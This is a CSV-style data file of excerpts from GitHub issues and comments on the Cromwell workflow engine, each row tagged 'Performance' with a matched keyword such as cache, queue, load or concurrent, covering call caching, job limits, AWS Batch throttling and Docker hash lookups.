Performance,"HtCondor backend should be responsive to abort requests from the engine, and kill and remove the job from it's internal queue.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1402:120,queue,queue,120,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1402,1,['queue'],['queue']
Performance,HtCondor cache implementation. Closes #1104,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1083:9,cache,cache,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1083,1,['cache'],['cache']
Performance,"I added an alert if the load stays ""high"" for at least 20 minutes (meaning jobs are not started) it should send a notification to the `cromwell-load-alerts` slack channel.; If it works and we want we can move them to the on call channel.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3508#issuecomment-380942774:24,load,load,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3508#issuecomment-380942774,2,['load'],"['load', 'load-alerts']"
Performance,"I added the `concurrent-job-limit` to the `reference.conf` and I will add it to the [Configuration draft on the WDL website](http://gatkforums.broadinstitute.org/dsde/discussion/8687/how-to-configure-cromwell), tracked in [DSDE-docs #1524](https://github.com/broadinstitute/dsde-docs/issues/1524).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1841#issuecomment-276804191:13,concurren,concurrent-job-limit,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1841#issuecomment-276804191,1,['concurren'],['concurrent-job-limit']
Performance,"I already ruled that out -- Docker itself is still functional. I didn't run hello world specifically, but I did was able to `docker run --it` and run a few commands. This is different from the behavior I see when I do not set the concurrent job limit to 1 on a local backend -- in that scenario I wouldn't be able to run any images at all, and need to forcibly quit + restart Docker to use it. For comparison, I ran the same WDL with the same inputs in miniwdl to see if it'd also get stuck, but it did not have this issue. miniwdl was able to complete the 1000x scattered task + the final task that gathers the scattered input. So it seems that Docker itself can handle launching a thousand containers one at a time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6946#issuecomment-1310582127:230,concurren,concurrent,230,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6946#issuecomment-1310582127,1,['concurren'],['concurrent']
Performance,"I also played around with bolting on the docker hashing too. To be clear, I like @mcovarr's PR here better, as it's much cleaner, and has tests! Still, here's some overlapping [code](https://github.com/broadinstitute/cromwell/compare/job_avoidance...ks_hash_docker_image) to look at, especially the first commit with an alternative way to get an `ActorSystem` down into the `BackendCall`. A few issues left though, but some/most of these can be logged as new tickets, and we can get basic wiring in for the moment via this PR. Biggest issue-- 10 seconds is right on the edge for testing _and_ checking the docker server for the hash, so different docker tests currently timeout intermittently. Among other issues I saw, `Future` exception handling may be different due to refactoring. For example converting `Future { /* big block */ }` to `/* big block */ hashFuture.map(hash => ...)` allows exceptions within the block to not get caught (as expected?). Also I wasn't sure yet how we want to handle some `Failure` cases, specifically when the docker server doesn't return a hash. I assume that means that we should just run again from scratch, and NOT go to a `FailedExecution` state in the database. Or maybe we should go to `Failure`, and just retry a particular operations later. With ~~Gatling~~ Tyburn load testing, perhaps we can log any docker client errors now, and start to distinguish them with custom error handling code as they pop up.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164760702:1308,load,load,1308,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164760702,2,['load'],['load']
Performance,"I am aiming to run several thousand samples using Cromwell server on AWS. In testing, when submitting more than a few jobs to batch, I see many errors like:. ```; Caused by: software.amazon.awssdk.services.batch.model.BatchException: Too Many Requests (Service: null; Status Code: 429; Request ID: b8d3f02a-deee-11e8-8f12-b5957ed5827f); ```. I think this has to do with AWS batch limits. The recommendation, it appears, is to set the concurrent-job-limit in cromwell config to some number like 16. (Setting to 100 results in the errors above). While that fixes the errors, it seems to limit the scale of what can be done on AWS. So, a few questions:. 1. Does the job submission mechanism (batch vs single) affect this behavior?; 2. Would the use of scatter-gather over large batches of otherwise independent samples help?; 3. Are there limit increases that can or should be requested from AWS to make batch more amenable to large numbers of workflows?; 4. Are the best practices for AWS different than for GCP with respect to workflow authoring and submission?. Thanks for any thoughts and sorry if I missed something obvious in the docs.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4355:434,concurren,concurrent-job-limit,434,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4355,1,['concurren'],['concurrent-job-limit']
Performance,"I am encountering call caching issues with images from google artifact registry (gar). . When I use image directly from dockerhub or gcr I have no call caching issues and see this in the logs. > 2024-07-19 14:35:24 cromwell-system-akka.dispatchers.engine-dispatcher-26890 INFO - BT-322 61ba2acc:garTest.simpleLs:-1:1 cache hit copying nomatch: could not find a suitable cache hit.; 2024-07-19 14:35:24 cromwell-system-akka.dispatchers.engine-dispatcher-26890 INFO - 61ba2acc-4274-423b-818a-8cf1da67cd44-EngineJobExecutionActor-garTest.simpleLs:NA:1 [UUID(61ba2acc)]: Could not copy a suitable cache hit for 61ba2acc:garTest.simpleLs:-1:1. No copy attempts were made. However, when I copy the same image to my access controlled google artifact registry I get this authentication error. > 2024-07-19 14:31:44 cromwell-system-akka.dispatchers.engine-dispatcher-3006 WARN - BackendPreparationActor_for_f20da4b8:garTest.simpleLs:-1:1 [UUID(f20da4b8)]: Docker lookup failed; java.lang.Exception: Failed to get docker hash for us-central1-docker.pkg.dev/xxx/yyy/aaa Request failed with status 403 and body {""errors"":[{""code"":""DENIED"",""message"":""Unauthenticated request. Unauthenticated requests do not have permission \""artifactregistry.repositories.downloadArtifacts\"" on resource \""projects/xxx/locations/us-central1/repositories/yyy\"" (or it may not exist)""}]}. The workflow completes successfully regardless of this error but call caching doesn't work when a gar image is used.; The service account I am using with the cromwell server has ""Artifact Registry Reader"" IAM role.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7473:317,cache,cache,317,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7473,3,['cache'],['cache']
Performance,"I am getting this bug in Cromwell 44. Could not evaluate expression: ""--mem-per-cpu="" + memory_mb: Cannot perform operation: --mem-per-cpu= + WomLong(1024)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659#issuecomment-512006346:106,perform,perform,106,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659#issuecomment-512006346,1,['perform'],['perform']
Performance,"I am running a workflow that will cache hit every job. Given the log dump on the command line, that seems to be happening. However, the timing diagram is not updating. All I see is the first job and the timing diagram has been in that state for over ten minutes.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1497:34,cache,cache,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1497,1,['cache'],['cache']
Performance,"I am running into the same bug on Terra. Not sure what version of Cromwell it is using. My wdl validates however, I get the a run time error. ```; Failed to evaluate input 'fastq1' (reason 1 of 1): No coercion defined from wom value(s) '""gs://fc-secure-46b3886a-473a-49ef-8073-022230a526ac/6463b025-27cf-4649-b6d0-59f860bdf18b/bam2FastQStarAlignWorkflow/a4a0d2f2-cc8b-41d8-a5b5-61cf6c2d0bd4/call-bamToFastq/cacheCopy/GTEX-1192X-0011-R10a-SM-DO941.1.fastq.gz""' of type 'File' to 'Array[File]'.; ```. adding '[' and ']' resolved the run time issue; ```; call starWorkflow.star_fastq_list {; input:; star_index = starIndex,; fastq1 = [ bamToFastq.firstEndFastq ],; fastq2 = [ bamToFastq.secondEndFastq ],; prefix = sampleId; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4550#issuecomment-1148945607:407,cache,cacheCopy,407,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4550#issuecomment-1148945607,1,['cache'],['cacheCopy']
Performance,"I am trying to disable task-level call caching by using the Volatile optimization: (https://cromwell.readthedocs.io/en/stable/optimizations/VolatileTasks/#the-volatile-optimization). Since the documentation is written for Version 1.0, and I am using draft-2, I have the parameter as a string, as opposed to a boolean, as follows:. ```; meta {; volatile: ""true""; }; ```. However, while the WDL validates successfully, after running I can see that the task is still copying from the cache as opposed to no call-caching. . Does volatile keyword not work when using draft-2, or am I not using this correctly? . I am running Cromwell v52. Please let me know if there is any information I can include that would be useful.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6808:69,optimiz,optimization,69,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6808,4,"['cache', 'optimiz']","['cache', 'optimization', 'optimizations']"
Performance,"I am trying to disable task-level call-caching using the volatile optimization (https://cromwell.readthedocs.io/en/stable/optimizations/VolatileTasks/#backend-support), but since the documentation is written for version 1.0 and I am using draft-2, I have the ""true"" as a string as opposed to a boolean as follows:. ```; meta {; volatile: ""true""; } ; ```; More info on boolean vs string in this issue (https://github.com/broadinstitute/cromwell/issues/5476). However, I find that despite having the volatile option in my task, and the WDL successfully validating via womtools, call-caching is still enabled for the task. Is the volatile optimization only allowable on version 1.0 or am I not including it correctly in my task?. I am on Cromwell v52. Please let me know if any other information would be useful.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6811:66,optimiz,optimization,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6811,3,['optimiz'],"['optimization', 'optimizations']"
Performance,"I am trying to reproduce one of the [examples](https://github.com/broadinstitute/wdl/blob/develop/SPEC.md#example-5-word-count) in the spec. It doesn't work out of the box since `wc` command produces a string with filename, and not just integer. Thus, I tried to substitute all non-digit characters with function `sub`:; ```; output {; Int count = read_int(sub(stdout(), ""\D"", """"); }; ```; However, I get an error:; ```; Unable to load namespace from workflow: Unrecognized token on line 7, column 40:. Int count = read_int(sub(stdout(), ""\D"", """")); ^; cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$3$$anon$1: Workflow input processing failed:; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1908:431,load,load,431,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1908,1,['load'],['load']
Performance,"I am trying to run Cromwell with docker images that were loaded with `docker load`. This means that the digests are unavailable (i.e. `<none>`). Unforutnately, this means that when looking up the image locally (i.e. when the config `docker.hash-lookup.method=""local""` is used), the image is not found. The offending lines of code are:; https://github.com/broadinstitute/cromwell/blob/1898d8103a06d160dc721d464862313e78ee7a2c/dockerHashing/src/main/scala/cromwell/docker/local/DockerCliClient.scala#L26; https://github.com/broadinstitute/cromwell/blob/1898d8103a06d160dc721d464862313e78ee7a2c/dockerHashing/src/main/scala/cromwell/docker/local/DockerCliClient.scala#L78-L92. Can we instead use the image ID instead of the digest when using local images?. <details>. <summary>log output</summary>. ```; [INFO] [09/16/2019 11:07:14.821] [cromwell-system-akka.dispatchers.engine-dispatcher-40] [akka://cromwell-system/user/SingleWorkflowRunnerActor/JobExecutionTokenDispenser] Not triggering log of token queue status. Effective log interval = None; [INFO] [09/16/2019 11:07:14.830] [cromwell-system-akka.dispatchers.engine-dispatcher-76] [akka://cromwell-system/user/SingleWorkflowRunnerActor/JobExecutionTokenDispenser] Assigned new job execution tokens to the following groups: 2b766fe6: 1; [2019-09-16 11:07:16,20] [error] Docker pull failed; java.lang.RuntimeException: Error running: docker pull <image>; Exit code: 1; Error response from daemon: pull access denied for <image> repository does not exist or may require 'docker login': denied: requested access to the resource is denied. 	at cromwell.docker.local.DockerCliClient.$anonfun$forRun$1(DockerCliClient.scala:58); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.docker.local.DockerCliClient.forRun(DockerCliClient.scala:50); 	at cromwell.docker.local.DockerCliClient.pull(DockerCliClient.scala:37); 	at cromwell.docker.local.DockerCliClient.pull$(DockerCliClient.scala:36); 	at cromwell.docker.local.DockerCliClient$.pull(DockerCliC",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5178:57,load,loaded,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5178,3,"['load', 'queue']","['load', 'loaded', 'queue']"
Performance,I assume it would be nice to have the hash of the Docker image Cromwell thinks your call ran with (pretending there are no race condition or other consistency issues between what Cromwell is doing to validate hashes and what's seen in JES)?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164547063:123,race condition,race condition,123,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164547063,1,['race condition'],['race condition']
Performance,"I believe this might be a consequence of the fact that the `WorkflowExecutionActor` is responsible for sending status updates to the metadata, and under the current load it accumulates those updates in its mailbox. Those updates then get processed and it's possible that 2 status updates close to each other in the mailbox end up generating the same timestamp. Those timestamps reflect the `WEA` view of the world, which might be delayed compared to reality if it's very busy. If that's not the desired behavior we could maybe have each job (EJEA) independently send status updates.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2173#issuecomment-295318559:165,load,load,165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2173#issuecomment-295318559,1,['load'],['load']
Performance,"I believe to do this properly, it's the specific backend that should grab the docker image hash when a task is actually run (as opposed to the engine which can evaluate it when it sends it to the backend... which could queue it for any length of time). When checking for a call cache hit... we should first check everything else that's cheap before getting this hash",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1617#issuecomment-259272505:219,queue,queue,219,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1617#issuecomment-259272505,2,"['cache', 'queue']","['cache', 'queue']"
Performance,"I can confirm that it is possible to set CPU's, memory, queue and project in the current develop branch. Only wall time I'm not so sure. @kshakir: Maybe you know more about this?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/583#issuecomment-242440566:56,queue,queue,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/583#issuecomment-242440566,1,['queue'],['queue']
Performance,"I can understand. This solution is not ideal. On the upside: it is only activated for those who willingly put ""cached-copy"" in their configs. The rest of the cromwell users are **not** affected by the lock mechanism. By default this does **not** affect anyone. I could adapt this PR and plaster the words: `WARNING: EXPERIMENTAL` all over it if that helps. EDIT: While I mention it ""is not ideal"", the only situation where the locks might not be effective is when using multiple cromwell processes, that do use the same execution folder. Does this happen often in practice? Is this even a supported use case?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-498211225:111,cache,cached-copy,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-498211225,1,['cache'],['cached-copy']
Performance,"I can't think of any runtime parameters (with the exception of `docker`); that should change the hashing. Also, are the inputs to the task hashed or; is it the fully rendered command block or what? Because if I have a; parameter to the task (such as ""preemptible_attempts"") that is only used in; the runtime block, (ideally) I'd like it to be ignored for call caching; purposes. On Fri, Sep 8, 2017 at 3:12 PM, Kate Voss <notifications@github.com> wrote:. > As a *workflow runner*, I want *certain parameters to be ignored in the; > hashing process*, so that I can *call cache on more workflows when the; > result is exactly the same*.; >; > - Effort: *?*; > - Risk: *Medium*; > - We should err on the side of hashing a workflow differently if we; > are not absolutely confident that the parameter does not impact the result.; > - Which parameters are ignored is NOT user-editable. This is to; > prevent users from accidentally ignoring parameters that do impact the; > result.; > - Business value: *Medium*; >; > Some parameters, such as preemptible_attempts and CPU, don't affect the; > outcome of the workflow but workflows with different CPU values will not; > call cache.; >; > @LeeTL1220 <https://github.com/leetl1220> and @geoffjentry; > <https://github.com/geoffjentry> to provide additional thoughts and; > context if helpful.; > Related issue #1210; > <https://github.com/broadinstitute/cromwell/issues/1210>; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2604>, or mute the; > thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk24fM_SrXs0gx-Ry1aw1opHFZAb5ks5sgZG5gaJpZM4PRlLU>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 8011A; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2604#issuecomment-328198717:571,cache,cache,571,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2604#issuecomment-328198717,2,['cache'],['cache']
Performance,"I conducted a bunch of testing on alpha and I have Results!. The test runs clocked in as follows:; - Client-side filtering (this PR, `fabece5`); - 1 hour, 1 minute, ; https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/470/; - 1 hour, 2 minutes, https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/471/; - Filtering in MySQL (original, `f666098`); - 1 hour, 2 minutes, https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/472/; - 1 hour, 2 minutes, https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/473/. The graphs below show the two client-side filtering runs, followed by the two MySQL filtering results. ---. Summarizer CPU is identical, inbound network bytes higher:. <img width=""1338"" alt=""Screen Shot 2019-09-13 at 8 13 00 PM"" src=""https://user-images.githubusercontent.com/1087943/64965213-93d73b80-d86a-11e9-9278-03b6f665c378.png"">. ---. Database page read/writes identical:. <img width=""1334"" alt=""Screen Shot 2019-09-13 at 8 13 39 PM"" src=""https://user-images.githubusercontent.com/1087943/64965215-93d73b80-d86a-11e9-9db5-4416f5e94719.png"">. ---. Database CPU identical:. <img width=""1332"" alt=""Screen Shot 2019-09-13 at 8 13 52 PM"" src=""https://user-images.githubusercontent.com/1087943/64965216-946fd200-d86a-11e9-9735-6d91a8b74a4d.png"">. ---. Database egress bytes modestly higher, consistent with higher inbound on summarizer:. <img width=""1336"" alt=""Screen Shot 2019-09-13 at 8 14 33 PM"" src=""https://user-images.githubusercontent.com/1087943/64965217-946fd200-d86a-11e9-8fb5-c11a49da15e4.png"">. ---. Not too surprising, but SQL query rate also identical:. <img width=""1336"" alt=""Screen Shot 2019-09-13 at 8 15 13 PM"" src=""https://user-images.githubusercontent.com/1087943/64965218-946fd200-d86a-11e9-9db7-3149df61c0e0.png"">. ---. I thought it was interesting that the only variable that showed much change is bytes over the network. Theory:. MySQL pages ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5125#issuecomment-531803474:221,Perform,PerformanceTest-against-Alpha,221,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5125#issuecomment-531803474,4,['Perform'],['PerformanceTest-against-Alpha']
Performance,"I confirmed this does throttle the token dispenser from the log output, though it may not get the AWS build passing until everyone rebases.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4588:22,throttle,throttle,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4588,1,['throttle'],['throttle']
Performance,"I did not have any experience with this little Maven-based utility so I performed the following steps for post-upgrade verification.; ```; sdk install maven; mvn compile; mvn test; mvn package // I think this is a superset of `compile` and `test` but they all take just a few seconds so 🤷‍♂️ ; ```; Closing automatic PR https://github.com/broadinstitute/cromwell/pull/6743 in favor of this one because we can trivially upgrade to the latest version, not just a security-hotfixed older version.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6747:72,perform,performed,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6747,1,['perform'],['performed']
Performance,"I did not know of this thread.; At our institute we have solved this differently. We use `singularity exec` and no specific pull command. This will try to locate the image in the cache whis is located in `SINGULARITY_CACHEDIR` (env variable). If it is already there it will use it. If not, it will download it. This will lead to race condition if it is used in a scatter. We use https://github.com/biowdl/prepull-singularity to pull the images beforehand, so no race conditions occur. I am also thinking of adding a `docker_pull` thing to the config, so you can do `singularity exec {image} echo done!` or something similar to make sure the cache is populated at workflow initialization time. I have no ETA on this though, for now the prepull singularity script works.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627146756:179,cache,cache,179,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627146756,4,"['cache', 'race condition']","['cache', 'race condition', 'race conditions']"
Performance,"I did performance testing by with a wdl that has 50 outputs. On a cache hit, it attempts to copy the 50 files, so with my change it would also perform 50*2 location lookups. I ran this wdl 10 times without my changes, and 10 times with my changes, with `call_cache_egress` set to ""none"". For each run, I looked at the timestamps for [when the job hashing job is initialized](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/job/EngineJobExecutionActor.scala#L504) , to [when the workflow completes](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/WorkflowExecutionActor.scala#L350). Without my changes, the difference between those timestamps was on average 9 seconds. . With my changes, the difference between those timestamps was on average 16 seconds.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-892952274:6,perform,performance,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-892952274,3,"['cache', 'perform']","['cache', 'perform', 'performance']"
Performance,"I did some benchmarking over the weekend. I ran a 1000+ job workflow on both the HSQL database with overflow file, and with sqlite. The Sqlite database creates 99M in files. The HSQLDB creates 9.5G in files, that is 100 times more... I restarted the workflow to see if the call caching worked properly. With the HSQLDB there was no issue in restarting. With SQLite everything worked fine until at some point early in the workflow cromwell hung. I interrupted the process, and cromwell started to shut down gracefully. `WriteMetadataActor shutting down: processing 108720 queued messages`. The processing of these messages takes more than half an hour. . The problem here is twofold: the SQLite backend is significantly slower than the HSQL in-memory database with overflow file (as expected) and the enormous amount of messages that Cromwell produces totally swamps it. (Judging from the shutdown scroll the rate is approximately 40 messages per second or 25ms per message processing time, sqlite should be able to work faster than that). EDIT: I did some research. It turns out SQLite creates a journal file and deletes it again. This means every transaction there are a few filesystem operations performed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specifi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:571,queue,queued,571,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906,1,['queue'],['queued']
Performance,"I encountered this error in Cromwell v26, while running a large workflow that appears to have failed. I am not sure whether it is the cause of the failure; I have not yet been able to locate what job this corresponds to. ; ```; [ERROR] [05/22/2017 00:14:05.821] [cromwell-system-akka.dispatchers.engine-dispatcher-38] [akka.dispatch.Dispatcher] null; java.lang.NullPointerException; 	at cromwell.engine.workflow.lifecycle.execution.callcaching.CallCacheWriteActor$$anonfun$1.apply(CallCacheWriteActor.scala:22); 	at cromwell.engine.workflow.lifecycle.execution.callcaching.CallCacheWriteActor$$anonfun$1.apply(CallCacheWriteActor.scala:19); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2286:651,concurren,concurrent,651,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2286,6,['concurren'],['concurrent']
Performance,"I feel like overall WDL developers need to have some way to control that docker images be cached within the WDL. Tasks that are not scattered are likely not relevant here, as one single download is unlikely to incur large egress charges. On the other hand for scattered tasks there should be a way for the WDL developer to demand caching, rather than relying on the user to do the right thing. Ideally this should all be handled by Google and container images, when downloaded, should be cached for a pre-determined amount of time. There is something called `mirror.gcr.io` but I did not fully understand how it works and whether it could be part of the solution here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-888389788:90,cache,cached,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-888389788,2,['cache'],['cached']
Performance,"I found a formal name for the approach of pooling identical requests and sending one to the server, it is ""[request coalescing](https://varnish-cache.org/docs/6.1/users-guide/vcl-grace.html#grace-mode)"". . There is an off-the-shelf ""caching HTTP reverse proxy"" known as [varnish](https://varnish-cache.org/docs/6.1/index.html) which can do this for us. This is probably best implemented as a caching/ request coalescing layer above cromwell. . This came a result of discussion around #4226.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4253:144,cache,cache,144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4253,2,['cache'],['cache']
Performance,"I found the config file in this link [cromwell.examples.conf](https://github.com/broadinstitute/cromwell/blob/develop/cromwell.example.backends/cromwell.examples.conf);. **BUT** when I set the `concurrent-job-limit = 2`, and run with `-Dconfig.file=cromwell.conf`，in `local` mode，but cromwell still forks **8** job, it seems the limit not working",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5359#issuecomment-575139656:194,concurren,concurrent-job-limit,194,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5359#issuecomment-575139656,1,['concurren'],['concurrent-job-limit']
Performance,"I had `hasing-strategy` instead of `hashing-strategy` in my config and lost loads of hours trying to debug the unbearably slow caching I was experiencing, and it turns out that the entire time Cromwell was simply ignoring the config I had written because of the typo. Cromwell should emit warnings when it sees config it doesn't recognize instead of silently ignoring them.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7109:76,load,loads,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7109,1,['load'],['loads']
Performance,"I had actually assumed that the singularity pull/caching mechanism would handle simultaneous downloads properly (by allowing only one to progress to fill the cache), but it doesn't appear to.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-537242867:158,cache,cache,158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-537242867,1,['cache'],['cache']
Performance,I had interpreted this as not an actual cache per se but just ensuring that there's only ever at most one metadata call per wf in flight. IOW as soon as the request is complete that cache entry would be evicted. I don't think we should be caching-caching.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4226#issuecomment-429011246:40,cache,cache,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4226#issuecomment-429011246,2,['cache'],['cache']
Performance,"I had to make a workaround for the workflow where the tool can sometimes return an empty file tsv file (as there was a bug in cromwell where read_tsv(empty_file) did not work. ; ```; Array[Array[String]] cached_samples = if(read_string(prepare_samples.cached)=="""") then [[]] else read_tsv(prepare_samples.cached); ```. However, with latest WOM model this workaround stopped working and now I get:; ```; WorkflowFailure(Evaluating row[0] + ""_cached"" failed: Failed to find index Success(WomInteger(0)) on array: Success([]) 0,List()); ```; I wonder why does it try to go to the 0 index of an empty array?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3368:252,cache,cached,252,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3368,2,['cache'],['cached']
